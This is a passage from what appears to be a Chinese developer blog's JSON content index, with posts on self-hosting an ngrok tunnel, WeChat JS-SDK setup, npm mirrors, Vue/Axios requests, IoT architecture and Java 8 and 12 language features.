必填，公众号的唯一标识 timestamp: , // 必填，生成签名的时间戳 nonceStr: &apos;&apos;, // 必填，生成签名的随机串 signature: &apos;&apos;,// 必填，签名 jsApiList: [] // 必填，需要使用的JS接口列表&#125;); signature 由 jsapi_ticket 、noncestr 、timestamp 和 url 生成，url中的域名必须是已经加入到 JS接口安全域名 中。 一般有前端提交 url 参数给后台，后台生成所有参数响应给前端，前端进行签名配置。","categories":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/categories/微信公众平台/"}],"tags":[{"name":"微信公众平台","slug":"微信公众平台","permalink":"http://yoursite.com/tags/微信公众平台/"}]},{"title":"自建ngrok服务内网穿透","slug":"Linux/自建ngrok服务内网穿透","date":"2019-04-02T09:32:31.000Z","updated":"2021-12-28T03:24:10.182Z","comments":true,"path":"Linux/自建ngrok服务内网穿透/","link":"","permalink":"http://yoursite.com/Linux/自建ngrok服务内网穿透/","excerpt":"","text":"使用场景 在个人PC电脑上调试 微信公众号，微信web开发者工具 需要公网域名。 ngrok将个人PC电脑的端口暴露到公网 本来用 nginx反向代理 + 路由器的虚拟服务器转发 可以很方便的解决这个场景，但最近公司路由器抽风，一直不好使。 官方的ngrok很不稳定，偶尔可以用。自建ngrok服务相对稳定，但要自己编译服务端和客户端的二进制文件。 最终效果公网访问 http://debug.mydomain.com 或者 https://debug.mydomain.com ，将直接访问到部署在我的PC电脑上的Tomcat服务，方便调试程序。 部署环境 公网阿里云 ESC，系统 CentOS（假设域名：mydomain.com） 公司内的开发笔记本，系统 Win10 我们将在服务器内编译二进制文件，下载到Win10运行。 安装编译环境1$ yum install -y perl-ExtUtils-MakeMaker mercurial golang 如果是Ubuntu系统 1$ apt-get install build-essential mercurial golang 下载ngrok源码123$ cd /opt$ git clone https://github.com/inconshreveable/ngrok.git ngrok$ cd ngrok 创建自签名证书123456789$ NGROK_DOMAIN=\"mydomain.com\"$ openssl genrsa -out base.key 2048$ openssl req -new -x509 -nodes -key base.key -days 10000 -subj \"/CN=$NGROK_DOMAIN\" -out base.pem$ openssl genrsa -out server.key 2048$ openssl req -new -key server.key -subj \"/CN=$NGROK_DOMAIN\" -out server.csr$ openssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -out server.crt -days 5000$ cp server.crt assets/server/tls/snakeoil.crt$ cp server.key assets/server/tls/snakeoil.key$ cp base.pem assets/client/tls/ngrokroot.crt 编译123456# 服务端 bin/ngrok$ make release-server# win64$ GOOS=windows GOARCH=amd64 make release-client# mac$ GOOS=darwin GOARCH=amd64 make release-client 启动服务端由于服务器环境中已有nginx存在，所以，这里的ngrok采用 7070 和 7071 端口。 12345$ /opt/ngrok/bin/ngrokd -tlsKey=/opt/ngrok/server.key -tlsCrt=/opt/ngrok/server.crt -domain=mydomain.com -httpAddr=:7070 -httpsAddr=:7071 -tunnelAddr=:7443 &gt; /opt/ngrok/ngrok.log &amp;$ netstat -tnlptcp 0 0 0.0.0.0:7070 LISTEN 12816/ngrokdtcp 0 0 0.0.0.0:7071 LISTEN 12816/ngrokdtcp 0 0 0.0.0.0:7443 LISTEN 12816/ngrokd 配置阿里云控制台 端口开放 在阿里云的 安全组规则 配置好 入方向 的端口 ，如将 7070/8080 范围对外开放。 域名解析 debug.mydomain.com 指向我们的服务器IP地址 。 配置服务器nginx反向代理如果服务器没有其他服务，则可以跳过这一步，直接给ngrok用80端口。 微信公众号开发 必须采用80和443端口，反向代理是为了将 debug.mydomain.com:80 流量转发到 -&gt; ngrok-server(7070,7071) 12345678910111213141516171819202122232425262728293031323334map $scheme $proxy_port &#123; \"http\" \"7070\"; \"https\" \"7071\"; default \"7070\";&#125;server &#123; listen 80; #listen [::]:80; listen 443; #listen [::]:443; server_name debug.mydomain.com; location / &#123; resolver 114.114.114.114 valid=2s; proxy_pass $scheme://$host:$proxy_port; proxy_redirect off; client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 90; proxy_read_timeout 90; proxy_buffer_size 4k; proxy_buffers 6 128k; proxy_busy_buffers_size 256k; proxy_temp_file_write_size 256k; &#125; ssl on; ssl_certificate /opt/ngrok/server.crt; ssl_certificate_key /opt/ngrok/server.key; access_log off; log_not_found off;&#125; 客户端下载相关平台的客户端放在一目录下，如win64的 ngrok.exe 。同目录下新建文本 ngrok.cfg，内容为 12server_addr: debug.mydomain.com:7443trust_host_root_certs: false 假设我本地笔记本跑了一个Tomcat，端口为8080 ，运行ngrok的命令如下： 1$ ngrok.exe -subdomain debug -proto=http -config=./ngrok.cfg 8080 其中 debug 是我的子域名，在浏览器打开 http://debug.mydomain.com ，如果能访问 Tomcat 的页面，就OK了。 流量入流路由如： server-nginx -&gt; server-ngrok -&gt; client-ngrok -&gt; tomcat 访问 http://127.0.0.1:4040 (ngrok的页面)，可以看到所有来自外部的请求内容。 本地前/后端分离如果本地笔记本有多个服务，可以在本地再搭建一个 nginx ，通过反向代理转发实现流量转发。 比如：我架构是 Vue + Tomcat 实现了前后端分离，Vue 的端口为 1234 ，Tomcat 端口依然为 8080 ，nginx 端口为 80 ，我们要将 ngrok 启动的端口改为 nginx 的 80 端口。 1$ ngrok.exe -subdomain debug -proto=http -config=./ngrok.cfg 80 流量入流路由如： server-nginx -&gt; server-ngrok -&gt; client-ngrok -&gt; pc-nginx -&gt; (vue + tomcat) 本地PC nginx 配置文件中增加一个虚拟服务器，配置如下： 12345678910server &#123; listen 80; server_name localhost; location /wx &#123; proxy_pass http://localhost:8080/wx/; &#125; location / &#123; proxy_pass http://localhost:1234; &#125;&#125; nginx 将 /wx 路径的转发到 Tomcat ， /wx 以外的路径请求全部转发给 Vue。 总结后续只需要启动 ngrok-server 和 ngrok-client 就可以打通公网与PC机的网络。如果要开辟新的子域名，则需要添加新的域名记录。 大量域名技巧: 编译基础域名设置为 debug.mydomain.com ，采用 *.debug.mydomain.com 作为 server-nginx 的name ，具体查看旧的commit记录。 参考：阿里云主机CentOS 7下编译安装ngrok","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"ngrok","slug":"ngrok","permalink":"http://yoursite.com/tags/ngrok/"}]},{"title":"JDK 12 新特性","slug":"Java/JDK 12 新特性","date":"2019-03-19T01:51:40.000Z","updated":"2021-12-30T08:32:39.694Z","comments":true,"path":"Java/JDK 12 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 12 新特性/","excerpt":"","text":"2019年3月19日 JDK 12 发布，非LTS 版本。 新特性 189: Shenandoah: A Low-Pause-Time Garbage Collector (Experimental) 230: Microbenchmark Suite 325: Switch Expressions (Preview) 334: JVM Constants API 340: One AArch64 Port, Not Two 341: Default CDS Archives 344: Abortable Mixed Collections for G1 346: Promptly Return Unused Committed Memory from G1 中文 189: Shenandoah 垃圾回收器 230: 在jdk源码里头新增了一套基础的Microbenchmark Suite 325: 对switch进行了增强 (Preview) 支持“ -&gt; ” 334: 新增了JVM Constants API 340: 一个AArch64端口 341: 默认CDS归档 344: 可中断的G1垃圾回收器 346: 通过G1更及时的返回未使用的内存 Java 12 已如期于 2019 年 3 月 19 日正式发布，此次更新是 Java 11 这一长期支持版本发布之后的一次常规更新，带来了不少 JVM、GC 功能增强、改进。 垃圾收集器：ShenandoahJava 12 中引入一个新的垃圾收集器：Shenandoah，它是作为一中低停顿时间的垃圾收集器而引入到 Java 12 中的，其工作原理是通过与 Java 应用程序中的执行线程同时运行，用以执行其垃圾收集、内存回收任务，通过这种运行方式，给虚拟机带来短暂的停顿时间。 Switch 表达式扩展（预览功能） Java 11 以及之前 Java 版本中的 Switch 语句是按照类似 C、C++ 这样的语言来设计的，在默认情况下支持 fall-through 语法。虽然这种传统的控制流通常用于编写低级代码，但 Switch 控制语句通常运用在高级别语言环境下的，因此其容易出错性掩盖其灵活性。 1234567int dayNumber = switch (day) &#123; case MONDAY, FRIDAY, SUNDAY -&gt; 6; case TUESDAY -&gt; 7; case THURSDAY, SATURDAY -&gt; 8; case WEDNESDAY -&gt; 9; default -&gt; throw new IllegalStateException(\"Huh? \" + day);&#125; Java 11 以及之前版本中，Switch 表达式支持下面类型： byte、char、short、int、Byte、Character、Short、Integer、enum、tring，在未来的某个 Java 版本有可能会允许支持 float、double 和 long （以及上面类型的封装类型）。 其他特性其他的看不懂，不写出来了。 更多信息请看 Java 12 新特性介绍","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"VMWare14宿主机之间无法拖文件","slug":"虚拟化技术&云平台/VMWare14宿主机之间无法拖文件","date":"2019-03-17T01:52:36.000Z","updated":"2019-03-17T01:52:36.000Z","comments":true,"path":"虚拟化技术&云平台/VMWare14宿主机之间无法拖文件/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare14宿主机之间无法拖文件/","excerpt":"","text":"环境VMware® Workstation 14 Pro 版本14.1.1 build-7528167，主机是Windows10，宿主机是Ubuntu18.04。 问题成功安装 VMware Tools ，但是无法从Win10拖文件到Ubuntu，也无法共享复制/粘贴。 解决在安装完VMWare Tools之后，重启Ubuntu，接着安装 open-vm-tools-desktop，安装完成再次重启。 1$ sudo apt-get install open-vm-tools-desktop","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"IoT架构探讨","slug":"IoT/IoT架构探讨","date":"2019-01-29T11:55:36.000Z","updated":"2021-12-28T03:24:10.139Z","comments":true,"path":"IoT/IoT架构探讨/","link":"","permalink":"http://yoursite.com/IoT/IoT架构探讨/","excerpt":"","text":"协议选择HTTP：client-server模式，如资源访问和数据上传，暂不支持数据下行COAP：client-server模式，如资源访问和数据上传，暂不支持数据下行MQTT：M2M模式，如智能灯和手机App通信，支持数据下行，如推送。 如果不是特别小（性能资源有限）的设备，都建议采用HTTP进行资源访问通讯，如果资源允许，加上SSL肯定是比较好的。 COAP是基于UDP的，我理解是迷你版的HTTP，它的协议设计也参考了HTTP，占用资源很小，适合资源有限的小型嵌入式设备。 现在基本需要双向通讯的设备，特别是要推送消息，都采用MQTT协议了。 MQTT数据采集MQTT做数据采集服务器的问题，服务端软件作为订阅者，订阅某个主题，本身这样接收数据没有问题，但是数据并发大时，只有一个订阅者单线程是否能顶得住？另外并发特别高，就是通过消息队列服务器缓冲压力（如kafka，rabbitmq，RocketMQ等） 服务端订阅消息 数据采集的存储日志类的数据，TSDB存储方便做可视化分析。 IoT设备的数据采集，日志类的应该采用TSDB时序数据库。设备将原始数据通过 MQTT 协议发送到订阅者，转发到消息队列，继而写入到 TSDB 中存储。前端的监控系统和大数据处理系统会利用 TSDB 的数据查询和计算分析能力进行业务监控和分析结果的实时展现。 TSDB时序数据库的选择OpenTSDB是可扩展的分布式时序数据库，底层依赖HBase。作为基于通用存储开发的时序数据库典型代表，起步比较早，在时序市场的认可度相对较高。阿里云智能TSDB高度兼容OpenTSDB协议，采用自研的索引，数据模型，流式聚合等技术手段提供更强大的时序能力。 TSDB For InfluxDB®是一款专门处理高写入和查询负载的时序数据库，无需外部依赖，用于存储大规模的时序数据并进行实时分析，包括来自DevOps监控、应用指标和IoT传感器上的数据。","categories":[{"name":"IoT","slug":"IoT","permalink":"http://yoursite.com/categories/IoT/"}],"tags":[]},{"title":"npm淘宝源","slug":"前端/npm淘宝源","date":"2019-01-29T03:52:36.000Z","updated":"2021-12-28T03:24:10.256Z","comments":true,"path":"前端/npm淘宝源/","link":"","permalink":"http://yoursite.com/前端/npm淘宝源/","excerpt":"","text":"国内的源 淘宝源（https://registry.npm.taobao.org） 腾讯源 (https://mirrors.cloud.tencent.com/npm/) ROOT账号问题可能是由于安全问题，在root账号下操作一些安装经常出问题，加上以下参数：1npm i npm@latest -g --unsafe-perm=true --allow-root CNPMcnpm注册为使用国内淘宝的源，不影响国外源npm的使用 1$ npm install -g cnpm --registry=https://registry.npm.taobao.org 用 cnpm install 安装依赖库会有些小问题，详细请看 《用cnpm安装软件库的一个问题》 修改npm的配置如果不想用cnpm而引起上述问题，可以按以下配置。12345$ npm config set registry https://registry.npm.taobao.org//验证配置$ npm config get registryhttps://registry.npm.taobao.org/ 删除cnpm这时候，你可以删除cnpm了12$ npm uninstall -g cnpmremoved 629 packages in 12.705s 还原官方源1$ npm config set registry https://registry.npmjs.org 查看当前源1$ npm config get registry","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Vue-Axios异步加载数据","slug":"前端/Vue-Axios异步加载数据","date":"2019-01-29T02:52:36.000Z","updated":"2021-12-28T03:24:10.250Z","comments":true,"path":"前端/Vue-Axios异步加载数据/","link":"","permalink":"http://yoursite.com/前端/Vue-Axios异步加载数据/","excerpt":"","text":"一开始使用 then(function (response){}) 的方式，一直无法调用到data的变量。改为 then(response =&gt;{}) 这种方式就可以了。 直接贴 TestList.vue 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;template&gt; &lt;div class=\"title\"&gt; &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;/h1&gt; &lt;ul&gt; &lt;li v-for=\"item in metadata\"&gt; &lt;h3&gt;&#123;&#123; item.name &#125;&#125;&lt;/h3&gt; &lt;img style=\"width: 80px ;height: 80px\" :src=item.icon /&gt; &lt;h5&gt;作者 &#123;&#123; item.author &#125;&#125;&lt;/h5&gt; &lt;span&gt;&#123;&#123; item.description &#125;&#125;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import axios from \"axios\"; export default &#123; name: 'TestList', data () &#123; return &#123; msg: '这是列表', metadata: [], &#125; &#125;, methods:&#123; getMetadata()&#123; console.log('getMetadata...'); axios .get('http://localhost:6868/story/metadata') .then(response =&gt;&#123; console.log(\"getMetadata Response ok\") this.metadata = response.data.data.works; console.log(\"----------------\") &#125;).catch(error=&gt;&#123; console.log(\"getMetadata Response Error\") console.log(error) &#125;) &#125; &#125;, mounted () &#123; //渲染之后执行 this.getMetadata(); &#125; &#125;&lt;/script&gt;&lt;!-- Add \"scoped\" attribute to limit CSS to this component only --&gt;&lt;style scoped&gt;&lt;/style&gt; AXios的常用方法定义一个 api.js 文件 123456789101112131415161718192021222324252627282930313233343536373839import axios from 'axios'const api = axios.create();api.defaults.baseURL = 'http://api.com';api.defaults.timeout = 5000;//可以设置头信息api.defaults.headers.common['Content-Type'] = 'application/x-www-form-urlencoded';api.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';//请求拦截api.interceptors.request.use(function (config) &#123; //在发送请求之前做些什么，比如给header设置 AccessToken config.headers.common['access-token'] = 'xxxxx';&#125;, function (error) &#123; // 对请求错误做些什么 console.log(error); return Promise.reject(error);&#125;);// 添加响应拦截器api.interceptors.response.use(function (response) &#123; // 对响应数据做点什么 // 加到时器主要是为了 展示Loading效果 项目中应去除 return response; &#125;, function (error) &#123; // 对响应错误做点什么 if(error.response) &#123; if(error.response.status== 401) &#123; // 如果返回401 即没有权限，跳到登录页重新登录 alert('请重新登录'); router.replace(&#123; path: '/login', query: &#123;redirect: router.currentRoute.fullPath&#125; &#125;) &#125; &#125; return Promise.reject(error); &#125;);export default api 在使用api的 .vue 文件内 import api.js 就可以发起请求了。 1. GET 带参数123456789101112this.$api(&#123; method: 'get', url: '/product', params:&#123; q:\"老虎\", page:this.page, &#125; &#125;).then((response) =&gt; &#123; console.log(response.data.data.products) &#125;).catch(function(error) &#123; console.log(error)&#125;) GET的请求 params 最终是 ?q=%E8%80%81%E8%99%8E&amp;page=0 的形式。 2. POST FormData1234567891011var sendData = new FormData();sendData.append('q',\"老虎\");sendData.append('page',this.page);this.$api(&#123; method: 'post', url: '/product', &#125;).then((response) =&gt; &#123; console.log(response.data.data.products) &#125;).catch(function(error) &#123; console.log(error)&#125;) 3. POST JSON123456789101112this.$api(&#123; method: 'post', url: '/product', data:&#123; q:\"老虎\"， page: this.page &#125; &#125;).then((response) =&gt; &#123; console.log(response.data.data.products) &#125;).catch(function(error) &#123; console.log(error)&#125;)","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"JDK 8 新特性1","slug":"Java/JDK 8 新特性1","date":"2019-01-29T01:51:36.000Z","updated":"2021-12-28T03:24:10.145Z","comments":true,"path":"Java/JDK 8 新特性1/","link":"","permalink":"http://yoursite.com/Java/JDK 8 新特性1/","excerpt":"","text":"原文链接 1. Lambda表达式Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性。Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。可以使代码变的更加简洁紧凑。 1.1 基本语法：1(参数列表) -&gt; &#123;代码块&#125; 需要注意： 参数类型可省略，编译器可以自己推断 如果只有一个参数，圆括号可以省略 代码块如果只是一行代码，大括号也可以省略 如果代码块是一行，且是有结果的表达式，return可以省略 注意：事实上，把Lambda表达式可以看做是匿名内部类的一种简写方式。当然，前提是这个匿名内部类对应的必须是接口，而且接口中必须只有一个函数！Lambda表达式就是直接编写函数的：参数列表、代码体、返回值等信息，用函数来代替完整的匿名内部类！ 1.2 用法示例示例1：多个参数准备一个集合： 12// 准备一个集合List&lt;Integer&gt; list = Arrays.asList(10, 5, 25, -15, 20); 假设我们要对集合排序，我们先看JDK7的写法，需要通过匿名内部类来构造一个Comparator： 12345678// Jdk1.7写法Collections.sort(list,new Comparator&lt;Integer&gt;() &#123; @Override public int compare(Integer o1, Integer o2) &#123; return o1 - o2; &#125;&#125;);System.out.println(list);// [-15, 5, 10, 20, 25] 如果是jdk8，我们可以使用新增的集合API：sort(Comparator c)方法，接收一个比较器，我们用Lambda来代替Comparator 的匿名内部类： 1234// Jdk1.8写法，参数列表的数据类型可省略：list.sort((i1,i2) -&gt; &#123; return i1 - i2;&#125;);System.out.println(list);// [-15, 5, 10, 20, 25] 对比一下Comparator中的compare()方法，你会发现：这里编写的Lambda表达式，恰恰就是compare()方法的简写形式，JDK8会把它编译为匿名内部类。是不是简单多了！ 别着急，我们发现这里的代码块只有一行代码，符合前面的省略规则，我们可以简写为： 123// Jdk8写法// 因为代码块是一个有返回值的表达式，可以省略大括号以及returnlist.sort((i1,i2) -&gt; i1 - i2); 示例2：单个参数还以刚才的集合为例，现在我们想要遍历集合中的元素，并且打印。 先用jdk1.7的方式： 1234// JDK1.7遍历并打印集合for (Integer i : list) &#123; System.out.println(i);&#125; jdk1.8给集合添加了一个方法：foreach() ，接收一个对元素进行操作的函数： 12// JDK1.8遍历并打印集合，因为只有一个参数，所以我们可以省略小括号:list.forEach(i -&gt; System.out.println(i)); 实例3：把Lambda赋值给变量Lambda表达式的实质其实还是匿名内部类，所以我们其实可以把Lambda表达式赋值给某个变量。 123456// 将一个Lambda表达式赋值给某个接口：Runnable task = () -&gt; &#123; // 这里其实是Runnable接口的匿名内部类，我们在编写run方法。 System.out.println(\"hello lambda!\");&#125;;new Thread(task).start(); 不过上面的用法很少见，一般都是直接把Lambda作为参数。 示例4：隐式finalLambda表达式的实质其实还是匿名内部类，而匿名内部类在访问外部局部变量时，要求变量必须声明为final！不过我们在使用Lambda表达式时无需声明final，这并不是说违反了匿名内部类的规则，因为Lambda底层会隐式的把变量设置为final，在后续的操作中，一定不能修改该变量： 正确示范： 1234567// 定义一个局部变量int num = -1;Runnable r = () -&gt; &#123; // 在Lambda表达式中使用局部变量num，num会被隐式声明为final System.out.println(num);&#125;;new Thread(r).start();// -1 错误案例： 1234567// 定义一个局部变量int num = -1;Runnable r = () -&gt; &#123; // 在Lambda表达式中使用局部变量num，num会被隐式声明为final，不能进行任何修改操作 System.out.println(num++);&#125;;new Thread(r).start();//报错 2. 函数式接口经过前面的学习，相信大家对于Lambda表达式已经有了初步的了解。总结一下： Lambda表达式是接口的匿名内部类的简写形式 接口必须满足：内部只有一个函数 其实这样的接口，我们称为函数式接口，我们学过的Runnable、Comparator都是函数式接口的典型代表。但是在实践中，函数接口是非常脆弱的，只要有人在接口里添加多一个方法，那么这个接口就不是函数接口了，就会导致编译失败。Java 8提供了一个特殊的注解@FunctionalInterface来克服上面提到的脆弱性并且显示地表明函数接口。而且jdk8版本中，对很多已经存在的接口都添加了@FunctionalInterface注解，例如Runnable接口： 另外，Jdk8默认提供了一些函数式接口供我们使用： 2.1 Function类型接口12345@FunctionalInterfacepublic interface Function&lt;T, R&gt; &#123; // 接收一个参数T，返回一个结果R R apply(T t);&#125; Function代表的是有参数，有返回值的函数。还有很多类似的Function接口： 接口名 描述 BiFunction&lt;T,U,R&gt; 接收两个T和U类型的参数，并且返回R类型结果的函数 DoubleFunction&lt;R&gt; 接收double类型参数，并且返回R类型结果的函数 IntFunction&lt;R&gt; 接收int类型参数，并且返回R类型结果的函数 LongFunction&lt;R&gt; 接收long类型参数，并且返回R类型结果的函数 ToDoubleFunction&lt;T&gt; 接收T类型参数，并且返回double类型结果 ToIntFunction&lt;T&gt; 接收T类型参数，并且返回int类型结果 ToLongFunction&lt;T&gt; 接收T类型参数，并且返回long类型结果 DoubleToIntFunction 接收double类型参数，返回int类型结果 DoubleToLongFunction 接收double类型参数，返回long类型结果 看出规律了吗？这些都是一类函数接口，在Function基础上衍生出的，要么明确了参数不确定返回结果，要么明确结果不知道参数类型，要么两者都知道。 2.2 Consumer系列12345@FunctionalInterfacepublic interface Consumer&lt;T&gt; &#123; // 接收T类型参数，不返回结果 void accept(T t);&#125; Consumer系列与Function系列一样，有各种衍生接口，这里不一一列出了。不过都具备类似的特征：那就是不返回任何结果。 2.3 Predicate系列12345@FunctionalInterfacepublic interface Predicate&lt;T&gt; &#123; // 接收T类型参数，返回boolean类型结果 boolean test(T t);&#125; Predicate系列参数不固定，但是返回的一定是boolean类型。 2.4 Supplier系列12345@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123; // 无需参数，返回一个T类型结果 T get();&#125; Supplier系列，英文翻译就是“供应者”，顾名思义：只产出，不收取。所以不接受任何参数，返回T类型结果。 3. 方法引用方法引用使得开发者可以将已经存在的方法作为变量来传递使用。方法引用可以和Lambda表达式配合使用。 3.1 语法：总共有四类方法引用： 语法 描述 类名::静态方法名 类的静态方法的引用 类名::非静态方法名 类的非静态方法的引用 实例对象::非静态方法名 类的指定实例对象的非静态方法引用 类名::new 类的构造方法引用 3.2 示例首先我们编写一个集合工具类，提供一个方法： 123456789101112131415public class CollectionUtil&#123; /** * 利用function将list集合中的每一个元素转换后形成新的集合返回 * @param list 要转换的源集合 * @param function 转换元素的方式 * @param &lt;T&gt; 源集合的元素类型 * @param &lt;R&gt; 转换后的元素类型 * @return */ public static &lt;T,R&gt; List&lt;R&gt; convert(List&lt;T&gt; list, Function&lt;T,R&gt; function)&#123; List&lt;R&gt; result = new ArrayList&lt;&gt;(); list.forEach(t -&gt; result.add(function.apply(t))); return result; &#125;&#125; 可以看到这个方法接收两个参数： List&lt;T&gt; list：需要进行转换的集合 Function&lt;T,R&gt;：函数接口，接收T类型，返回R类型。用这个函数接口对list中的元素T进行转换，变为R类型 接下来，我们看具体案例： 3.2.1 类的静态方法引用1List&lt;Integer&gt; list = Arrays.asList(1000, 2000, 3000); 我们需要把这个集合中的元素转为十六进制保存，需要调用Integer.toHexString()方法： 123public static String toHexString(int i) &#123; return toUnsignedString0(i, 4);&#125; 这个方法接收一个 i 类型，返回一个String类型，可以用来构造一个Function的函数接口： 我们先按照Lambda原始写法，传入的Lambda表达式会被编译为Function接口，接口中通过Integer.toHexString(i)对原来集合的元素进行转换： 123// 通过Lambda表达式实现List&lt;String&gt; hexList = CollectionUtil.convert(list, i -&gt; Integer.toHexString(i));System.out.println(hexList);// [3e8, 7d0, bb8] 上面的Lambda表达式代码块中，只有对Integer.toHexString()方法的引用，没有其它代码，因此我们可以直接把方法作为参数传递，由编译器帮我们处理，这就是静态方法引用： 123// 类的静态方法引用List&lt;String&gt; hexList = CollectionUtil.convert(list, Integer::toHexString);System.out.println(hexList);// [3e8, 7d0, bb8] 3.2.2 类的非静态方法引用接下来，我们把刚刚生成的String集合hexList中的元素都变成大写，需要借助于String类的toUpperCase()方法： 123public String toUpperCase() &#123; return toUpperCase(Locale.getDefault());&#125; 这次是非静态方法，不能用类名调用，需要用实例对象，因此与刚刚的实现有一些差别，我们接收集合中的每一个字符串s。但与上面不同然后s不是toUpperCase()的参数，而是调用者： 123// 通过Lambda表达式，接收String数据，调用toUpperCase()List&lt;String&gt; upperList = CollectionUtil.convert(hexList, s -&gt; s.toUpperCase());System.out.println(upperList);// [3E8, 7D0, BB8] 因为代码体只有对toUpperCase()的调用，所以可以把方法作为参数引用传递，依然可以简写： 123// 类的成员方法List&lt;String&gt; upperList = CollectionUtil.convert(hexList, String::toUpperCase);System.out.println(upperList);// [3E8, 7D0, BB8] 3.2.3 指定实例的非静态方法引用下面一个需求是这样的，我们先定义一个数字Integer num = 2000，然后用这个数字和集合中的每个数字进行比较，比较的结果放入一个新的集合。比较对象，我们可以用Integer的compareTo方法: 123public int compareTo(Integer anotherInteger) &#123; return compare(this.value, anotherInteger.value);&#125; 先用Lambda实现， 123456List&lt;Integer&gt; list = Arrays.asList(1000, 2000, 3000);// 某个对象的成员方法Integer num = 2000;List&lt;Integer&gt; compareList = CollectionUtil.convert(list, i -&gt; num.compareTo(i));System.out.println(compareList);// [1, 0, -1] 与前面类似，这里Lambda的代码块中，依然只有对num.compareTo(i)的调用，所以可以简写。但是，需要注意的是，这次方法的调用者不是集合的元素，而是一个外部的局部变量num，因此不能使用 Integer::compareTo，因为这样是无法确定方法的调用者。要指定调用者，需要用 对象::方法名的方式： 1234// 某个对象的成员方法Integer num = 2000;List&lt;Integer&gt; compareList = CollectionUtil.convert(list, num::compareTo);System.out.println(compareList);// [1, 0, -1] 3.2.4 构造函数引用最后一个场景：把集合中的数字作为毫秒值，构建出Date对象并放入集合，这里我们就需要用到Date的构造函数： 1234567/** * @param date the milliseconds since January 1, 1970, 00:00:00 GMT. * @see java.lang.System#currentTimeMillis() */public Date(long date) &#123; fastTime = date;&#125; 我们可以接收集合中的每个元素，然后把元素作为Date的构造函数参数： 1234// 将数值类型集合，转为Date类型List&lt;Date&gt; dateList = CollectionUtil.convert(list, i -&gt; new Date(i));// 这里遍历元素后需要打印，因此直接把println作为方法引用传递了dateList.forEach(System.out::println); 上面的Lambda表达式实现方式，代码体只有new Date()一行代码，因此也可以采用方法引用进行简写。但问题是，构造函数没有名称，我们只能用new关键字来代替： 123// 构造方法List&lt;Date&gt; dateList = CollectionUtil.convert(list, Date::new);dateList.forEach(System.out::println); 注意两点： 上面代码中的System.out::println 其实是 指定对象System.out的非静态方法println的引用 如果构造函数有多个，可能无法区分导致传递失败 4.默认方法和静态方法。4.1 默认方法默认方法使得开发者可以在 不破坏二进制兼容性的前提下，往现存接口中添加新的方法，即不强制那些实现了该接口的类也同时实现这个新加的方法。 默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写，例子代码如下： 1234567891011121314151617private interface Defaulable &#123; // Interfaces now allow default methods, the implementer may or // may not implement (override) them. default String notRequired() &#123; return \"Default implementation\"; &#125; &#125;private static class DefaultableImpl implements Defaulable &#123;&#125;private static class OverridableImpl implements Defaulable &#123; @Override public String notRequired() &#123; return \"Overridden implementation\"; &#125;&#125; Defaulable接口使用关键字default定义了一个默认方法notRequired()。DefaultableImpl类实现了这个接口，同时默认继承了这个接口中的默认方法；OverridableImpl类也实现了这个接口，但覆写了该接口的默认方法，并提供了一个不同的实现。 4.2 静态方法Java 8带来的另一个有趣的特性是在接口中可以定义静态方法，我们可以直接用接口调用这些静态方法。例子代码如下： 123456private interface DefaulableFactory &#123; // Interfaces now allow static methods static Defaulable create( Supplier&lt; Defaulable &gt; supplier ) &#123; return supplier.get(); &#125;&#125; 下面的代码片段整合了默认方法和静态方法的使用场景： 12345678public static void main( String[] args ) &#123; // 调用接口的静态方法，并且传递DefaultableImpl的构造函数引用来构建对象 Defaulable defaulable = DefaulableFactory.create( DefaultableImpl::new ); System.out.println( defaulable.notRequired() ); // 调用接口的静态方法，并且传递OverridableImpl的构造函数引用来构建对象 defaulable = DefaulableFactory.create( OverridableImpl::new ); System.out.println( defaulable.notRequired() );&#125; 这段代码的输出结果如下： 12Default implementationOverridden implementation 由于JVM上的默认方法的实现在字节码层面提供了支持，因此效率非常高。默认方法允许在不打破现有继承体系的基础上改进接口。该特性在官方库中的应用是：给java.util.Collection接口添加新方法，如stream()、parallelStream()、forEach()和removeIf()等等。 尽管默认方法有这么多好处，但在实际开发中应该谨慎使用：在复杂的继承体系中，默认方法可能引起歧义和编译错误。如果你想了解更多细节，可以参考官方文档。 5. OptionalJava应用中最常见的bug就是空值异常。 Optional仅仅是一个容器，可以存放T类型的值或者null。它提供了一些有用的接口来避免显式的null检查，可以参考Java 8官方文档了解更多细节。 接下来看一点使用Optional的例子：可能为空的值或者某个类型的值： 1234Optional&lt; String &gt; fullName = Optional.ofNullable( null );System.out.println( \"Full Name is set? \" + fullName.isPresent() ); System.out.println( \"Full Name: \" + fullName.orElseGet( () -&gt; \"[none]\" ) ); System.out.println( fullName.map( s -&gt; \"Hey \" + s + \"!\" ).orElse( \"Hey Stranger!\" ) ); 如果Optional实例持有一个非空值，则isPresent()方法返回true，否则返回false；如果Optional实例持有null，orElseGet()方法可以接受一个lambda表达式生成的默认值；map()方法可以将现有的Optional实例的值转换成新的值；orElse()方法与orElseGet()方法类似，但是在持有null的时候返回传入的默认值，而不是通过Lambda来生成。 上述代码的输出结果如下： 123Full Name is set? falseFull Name: [none]Hey Stranger! 再看下另一个简单的例子： 12345Optional&lt; String &gt; firstName 